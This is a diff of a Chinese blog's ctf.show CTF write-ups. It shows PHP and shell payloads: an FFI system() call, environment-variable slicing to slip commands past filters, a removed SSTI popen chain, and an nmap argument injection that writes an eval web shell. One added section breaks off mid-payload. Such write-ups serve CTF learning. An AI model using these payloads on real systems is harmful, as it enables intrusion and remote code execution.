@@ -1190,38 +1190,50 @@
 
 <p>c=try {$dbh = new PDO(‘mysql:host=localhost;dbname=ctftraining’, ‘root’, ‘root’);foreach($dbh-&gt;query(‘select load_file(“/flag36.txt”)’) as $row) {echo($row[0]).”|”; }$dbh = null;}catch (PDOException $e) {echo $e- &gt;getMessage();<strong>exit</strong>(0);}<strong>exit</strong>(0);</p>
 <p>原理：在数据库中查找flag36.txt然后抛出异常，输出其中内容</p>
-<h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="web-78"><a href="#web-78" class="headerlink" title="web 78"></a>web 78</h3><p>用php伪协议</p>
-<h3 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a>web 79</h3><p>用data伪协议</p>
-<h3 id="web-80"><a href="#web-80" class="headerlink" title="web 80"></a>web 80</h3><p>随便输入一个页面查看服务器的系统</p>
-<p>用file伪协议抓包之后在网页的标头信息构造漏洞在日志文件中getshell</p>
-<h3 id="web-81"><a href="#web-81" class="headerlink" title="web 81"></a>web 81</h3><p>直接file=文件的日志文件</p>
-<p>然后抓包构造标头</p>
-<h3 id="web-82-86"><a href="#web-82-86" class="headerlink" title="web 82-86"></a>web 82-86</h3><p>环境有问题，现在没办法做</p>
-<h3 id="web-87"><a href="#web-87" class="headerlink" title="web 87"></a>web 87</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span></span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $content = $_POST[&#x27;content&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><p>一样可以用上面的代码读取到文件目录，可以看到flag在falg36x.txt或者readflag中</p>
+<p>但是我们用上面的sql方法读取文件的时候发现，sql被ban了，得想另一种办法</p>
+<p>可以利用FFI（但是FFI只有在php7.4之后才有）</p>
+<p>新姿势：$ffi = FFI::cdef(“int system(const char *command);”);创建一个system对象</p>
+<p>然后将readflag重定向</p>
+<p>最后调用system执行$a</p>
+<p>最后访问我们重定向的文件</p>
+<h3 id="web-118"><a href="#web-118" class="headerlink" title="web 118"></a>web 118</h3><p>这题又是一个新姿势，我们可以利用环境变量或者路径含有的字母来执行命令</p>
+<p>这题没有过滤空格还有路径包含</p>
+<p>而且给出的提示中有当前目录是/var/www/html</p>
+<p>以及环境变量是/bin</p>
+<p>我们可以调用环境变量的最后一个字母（~A）以及当前目录中最后一个字母组成nl后面包含题目给我们的flag所在位置（？没有被ban）</p>
+<p>最终payload：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;PATH~A&#125;<span class="variable">$&#123;PWD~A&#125;</span>????.???</span></span><br></pre></td></tr></table></figure>
 
-<p>我们需要写入content数据写进file中，但是要绕过这个die</p>
-<p>考到了伪协议绕过，我们可以用伪协议编码绕过，用base64或者是rot13base64解码的时候<?;>等会被忽略，最后也就会变成phpdie然后添加两个字符之后对后面的数再继续进行解码这样我们就直接绕过了这个死亡杂糅（我这题base64没做出来，用的rot13）rot13编码之后` <?php die('大佬别秀了');?><code>会变成</code><?cuc qvr('大佬别秀了');?>`再进行一次编码他就会恢复原状，如果php没有开启短标签的话，php不认识这个字符那么他就不会执行，我们直接在后面添加我们想要输入的代码然后进行一次rot13编码，当他在进行一次rot13编码的时候，他就会变成我们想要输入的原始形态，就绕过了前面的die不会退出。</p>
-<p>参考链接：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://xz.aliyun.com/t/8163#toc-3</span><br><span class="line">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</span><br></pre></td></tr></table></figure>
+<p>附上LINUX的环境变量：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">查看环境变量  (environment)</span><br><span class="line">env</span><br><span class="line">一些环境变量说明</span><br><span class="line">HOSTNAME=linux.dmtsai.tw  主机名称</span><br><span class="line">SHELL=/bin/bash  当前环境下，使用的shell是哪一个程序。</span><br><span class="line">TERM=xterm  终端使用的环境是什么类型</span><br><span class="line">HISTSIZE=1000 记录命令的数目</span><br><span class="line">USER=root  用户的名称</span><br><span class="line">ENV=/root/.bashrc  使用的个人环境设置文件</span><br><span class="line">MAIL=/var/spool/mail/root  这个用户所采用的邮箱位置</span><br><span class="line">PATH=/sbin:/usr/sbin:/bin  执行文件命令搜索路径</span><br><span class="line">PWD=/root  当前用户所在的工作目录(利用pwd取出)</span><br><span class="line">LANG=en_US,UTF-8 与语系有关</span><br><span class="line">HOME=/root 用户的家目录</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+<h3 id="web-119"><a href="#web-119" class="headerlink" title="web 119"></a>web 119</h3><p>跟上题类似但是需要构造不一样的东西上题构造的是无法用的</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#&#125;</span></span></span><br><span class="line">1:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">##&#125;</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#SHLVL&#125;</span></span></span><br><span class="line">4-5:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#RANDOM&#125;</span></span></span><br><span class="line">/:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;HOME:<span class="variable">$&#123;#&#125;</span>:<span class="variable">$&#123;##&#125;</span>&#125;</span></span><br><span class="line">t:</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;HOME:<span class="variable">$&#123;#HOSTNAME&#125;</span>:<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span></span><br></pre></td></tr></table></figure>
 
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1 PHP_CFLAGS=-fstack-protectcor-strong-fpic-fpie-o2-D_LARGEFILE_SOURCE -D_FI</span><br><span class="line">LE_OFFSET_BITS=64</span><br><span class="line">2</span><br><span class="line">3 PHP_VERSION=7.3.22 /版本</span><br><span class="line">4 SHLVL=2 /記錄多個bash進程實例嵌套深度的累加器</span><br><span class="line">5 [PATH] =&gt; /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">6 [HOSTNAME] =&gt; glot-runner /主機名</span><br><span class="line">[PHPIZE_DEPS] =&gt; autoconf dpkg-dev file g++</span><br><span class="line">gcc libc-dev make pkg-config re2c</span><br><span class="line">7</span><br><span class="line">8 [PHP_INI_DIR] =&gt; /usr/local/etc/php</span><br><span class="line">9 [PHP_CFLAGS] =&gt; -fstack-protector-strong -fpic -fpie -O2</span><br><span class="line">10 [PHP_CPPFLAGS] =&gt; -fstack-protector-strong -fpic -fpie -O2</span><br><span class="line">11 [PHP_LDFLAGS] =&gt; -Wl,-O1 -Wl,--hash-style=both -pie</span><br><span class="line">[GPG_KEYS] =&gt; 1729F83938DA44E27BA0F4D3DBDB397470D12172 B1B44D8F021E4E2</span><br><span class="line">D6021E995DC9FF8D3EE5AF27F</span><br><span class="line">12</span><br><span class="line">13 [PHP_VERSION] =&gt; 7.2.1</span><br><span class="line">14</span><br><span class="line">[PHP_ASC_URL] =&gt; https://secure.php.net/get/php-7.2.1.tar.xz.asc/from/</span><br><span class="line">this/mirror</span><br><span class="line">15</span><br><span class="line">[PHP_SHA256] =&gt; 6c6cf82fda6660ed963821eb0525214bb3547e8e29f447b9c15b2d</span><br><span class="line">8e6efd8822</span><br><span class="line">16</span><br><span class="line">17 [PHP_MD5] =&gt;</span><br><span class="line">18 [HOME] =&gt; /home/glot</span><br><span class="line">19 [PHP_SELF] =&gt; /tmp/543750210/main.php</span><br><span class="line">20 [SCRIPT_NAME] =&gt; /tmp/543750210/main.php</span><br><span class="line">21 [SCRIPT_FILENAME] =&gt; /tmp/543750210/main.php</span><br><span class="line">22 [PATH_TRANSLATED] =&gt; /tmp/543750210/main.php</span><br><span class="line">23 [DOCUMENT_ROOT] =&gt;</span><br><span class="line">24 [REQUEST_TIME_FLOAT] =&gt; 1524198667.12</span><br><span class="line">25 [REQUEST_TIME] =&gt; 1524198667</span><br><span class="line">26 [argv] =&gt; Array</span><br><span class="line">27 (</span><br><span class="line">28 [0] =&gt; /tmp/543750210/main.php</span><br><span class="line">29 )</span><br><span class="line">30 [argc] =&gt; 1</span><br><span class="line">31 )</span><br></pre></td></tr></table></figure>
 
-<h3 id="web-88"><a href="#web-88" class="headerlink" title="web 88"></a>web 88</h3><p>过滤的字符串</p>
-<p>php ~ !   @ #   $   %  ^  &amp;  *   (     )   -    _  +  =  .</p>
-<p>跟前面一样，可以直接用伪协议读，但是解码之后最后可能会有= + 等符号，可以在后面直接加几个1来混淆</p>
-<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web-361"><a href="#web-361" class="headerlink" title="web 361"></a>web 361</h3><p>这里跳了一下，看一下模板，ssti</p>
-<p>题目的提示：名字就是提示，我们只需要在网页的后面以get方式传入一个值就行了</p>
-<p>既然是ssti那么我们直接测试一下49看一下</p>
-<p>成功返回了49，那就肯定了就是这里。</p>
-<p>那么我们直接开始调用里面的魔术方法</p>
-<p><code>&#39;&#39;.__class__.__mro__</code>可以看到object类在2那么数组就是1，然后我们进去看一看它里面的类</p>
-<p><code>&#39;&#39;.__class__.__mro__[1].__subclasses__()</code>可以看到回显了很多类，我们查找可以执行os命令的类</p>
-<p>找到了在133，那么数组就是132我们直接调用初始化，然后globals全局来查找可以使用的方法及变量参数</p>
-<p>这里面os是空的，继续找，找到popen</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>非预期：</p>
+<p>可以看到PHP_CFLAGS中含有tac，直接构造数字3取PHP_CFLAGS的第三个的三位就行了</p>
+<h3 id="web-120"><a href="#web-120" class="headerlink" title="web 120"></a>web 120</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span></span><br><span class="line">    $code=$_POST[&#x27;code&#x27;];</span><br><span class="line">    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    </span><br><span class="line">        if(strlen($code)&gt;65)&#123;</span><br><span class="line">            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 
 
+<p>上面的题目虽然没有过滤，但是我们用的长度太长了会被后面的小于65pass</p>
+<p>所以我们的换一种方法构造</p>
+<p>可以尝试一下构造base64</p>
+<p>我们只需要构造出4和6</p>
+<p>我们还记得118的提示</p>
+<p>然后PHP_VERSION的长度是6</p>
+<p>pwd的长度是4</p>
+<p>可以构造</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">????$&#123;#PWD&#125; ????.???  #base64 flag.php</span><br></pre></td></tr></table></figure>
+
+<p>但是没办法执行，应该是位置发生了什么变化把，换一种方法，构造出/bin然后直接执行看看</p>
+<p>想到可以构造/bin/base64 ????.???</p>
+<p>现在的问题就是构造一个/</p>
+<p>可以用pwd的第一个字符就是/</p>
+<p>`${PWD::$</p>
 ]]></content>
       <tags>
         <tag>ctf-show</tag>
@@ -1466,6 +1478,9 @@
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot; . &#x27;1&#x27;\\&#x27;&#x27;\&#x27;</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">\\会被解析成一个\两个连续的单引号会被解析成一个空白</span><br><span class="line">如果我们输入的是</span><br><span class="line">1&#x27;命令&#x27;</span><br><span class="line">那么就会变成</span><br><span class="line">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F&quot; . &#x27;127.0.0.1&#x27;\\&#x27;&#x27; 命令 &#x27;\\&#x27;&#x27;&#x27;</span><br><span class="line">也就是</span><br><span class="line">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F&quot; . &#x27;127.0.0.1&#x27; 命令 \</span><br><span class="line">我们输入的命令就会被nmap解析成条件，我们就可以写入一个nmap写文件参数执行。</span><br></pre></td></tr></table></figure>
+
+<p>附上nmap的利用参数：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">选项 解释</span><br><span class="line">-oN 标准保存</span><br><span class="line">-oX XML保存</span><br><span class="line">-oG Grep保存</span><br><span class="line">-oA 保存到所有格式</span><br><span class="line">-append-output 补充保存文件</span><br></pre></td></tr></table></figure>
 
 <p>最终payload：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#x27; &lt;?php eval($_POST[&quot;a&quot;]); ?&gt; -oG hack.php &#x27;</span><br></pre></td></tr></table></figure>
